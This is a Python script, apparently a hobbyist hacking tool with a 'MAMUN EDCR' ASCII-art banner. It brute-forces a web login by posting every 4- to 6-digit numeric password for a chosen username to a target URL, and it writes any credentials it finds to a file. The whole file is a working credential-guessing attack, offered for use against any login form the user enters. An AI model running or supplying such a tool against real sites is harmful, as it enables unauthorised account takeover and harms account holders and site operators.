import requests
from colorama import Fore, Style, init
from pyfiglet import Figlet

# Initialize colorama for colored output
init(autoreset=True)

# Function to generate ASCII art for the name "MAMUN EDCR"
def display_ascii_art():
    figlet = Figlet(font='slant')  # You can change the font if desired
    name = "MAMUN EDCR"
    ascii_art = figlet.renderText(name)
    print(Fore.CYAN + ascii_art)  # Print ASCII art in cyan color

# Function to perform brute-force attack
def brute_force(target_url, username):
    # Define the range of password lengths (4 to 6 digits)
    for length in range(4, 7):  # 4, 5, 6
        # Generate all possible passwords for the current length
        for password in range(10 ** length):
            # Format the password with leading zeros (e.g., 0000, 00001, 000123)
            formatted_password = f"{password:0{length}}"
            
            # Prepare the payload for the POST request
            payload = {
                'username': username,
                'password': formatted_password
            }
            
            # Send a POST request to the target URL
            try:
                response = requests.post(target_url, data=payload)
                
                # Check if the login was successful (customize this based on the response)
                if "Login failed" not in response.text:  # Replace with the actual success condition
                    print(Fore.GREEN + f"[+] Success! Username: {username}, Password: {formatted_password}")
                    # Save the successful password to a file
                    with open("success.txt", "w") as file:
                        file.write(f"Username: {username}, Password: {formatted_password}")
                    return  # Stop the script if the password is found
                else:
                    print(Fore.RED + f"[-] Trying password: {formatted_password}")
            
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[-] Error: {e}")
                return

    print("Brute-force attack completed.")

# Main program
if __name__ == "__main__":
    # Display ASCII art for "MAMUN EDCR"
    display_ascii_art()
    
    # Input target URL and username
    target_url = input("Enter the target URL (e.g., http://localhost/login): ")
    username = input("Enter the username: ")
    
    # Start the brute-force attack
    brute_force(target_url, username)
